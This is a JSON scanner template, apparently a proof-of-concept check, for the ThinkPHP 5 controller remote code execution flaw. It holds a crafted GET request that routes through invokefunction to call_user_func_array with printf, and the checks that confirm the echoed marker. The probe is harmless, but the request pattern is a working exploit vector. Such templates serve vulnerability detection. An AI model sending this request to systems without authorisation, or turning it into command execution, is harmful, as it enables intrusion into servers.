{
    "Name": "thinkphp5-controller-rce",
    "Description": "thinkphp5-controller-rce",
    "Product": "thinkphp",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "a29hbHIgaXMg%d2F0Y2hpbmcgeW9129"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
